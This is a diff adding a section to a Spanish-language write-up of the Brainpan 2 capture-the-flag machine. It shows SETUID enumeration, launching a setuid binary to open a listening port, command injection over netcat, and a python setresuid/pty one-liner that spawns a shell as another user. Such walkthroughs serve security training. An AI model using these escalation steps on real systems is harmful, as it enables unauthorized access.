@@ -238,9 +238,68 @@ whoami
 root
 ```
 
+> El usuario obtenido no es el verdadero usuario ROOT. Se puede observar esto en el archivo /etc/passwd.
+> Volvemos a buscar un archivo con SETUID y encontramos un archivo interesante en /opt.
+```
+root # find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/opt/old/brainpan-1.8/brainpan-1.8.exe
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+root # ls -la
+ls -la
+total 36
+drwxrwxr-x 2 root  staff  4096 Nov  5  2013 .
+drwx------ 3 root  root   4096 Nov  4  2013 ..
+-rwsr-xr-x 1 puck  puck  17734 Nov  4  2013 brainpan-1.8.exe
+-rw-r--r-- 1 puck  puck   1227 Nov  5  2013 brainpan.7
+-rw-rw-rw- 1 puck  staff    25 Feb 13 19:06 brainpan.cfg
+root # pwd
+pwd
+/opt/old/brainpan-1.8
+```
+
+> Al ejecutar el archivo brainpan-1.8.exe abre un puerto y conexión en base a la configuración del archivo brainpan.cfg
+> El archivo brainpan.cfg debe tener el IPADDR en 0.0.0.0, esto indica que se puede establecer una conexión desde cualquier dirección IP.
+
+root # ./brainpan-1.8.exe &
+./brainpan-1.8.exe &
+[1] 9018
+root # port = 9335
+ipaddr = 0.0.0.0
++ bind done
++ waiting for connections...
+
+```
+root # netstat -lntp
+netstat -lntp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      8671/           
+tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:9335            0.0.0.0:*               LISTEN      -    
+```
+> Nos conectamos por NETCAT al nuevo puerto abierto: 9335
+> Identificamos nuevamente la inyección de comandos a través de la opción VIEW pero esta vez tenemos privilegios del usuario PUCK.
+
+<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain12.jpg" width="80%"></img>
+
+> Establecemos una conexión NETCAT.
+> Para establecer una shell interactiva ejecutamos lo siguiente:
+```
+python -c 'import os,pty;os.setresuid(1001,1001,1001);pty.spawn("/bin/bash");'
+```
+
+<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain13.jpg" width="80%"></img>
 
 
+> En el archivo .bash_history encontramos la pista de que es posible conectarnos por SSH a través de llaves sin requerir credenciales.
 
+<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain14.jpg" width="80%"></img>
 
 
 
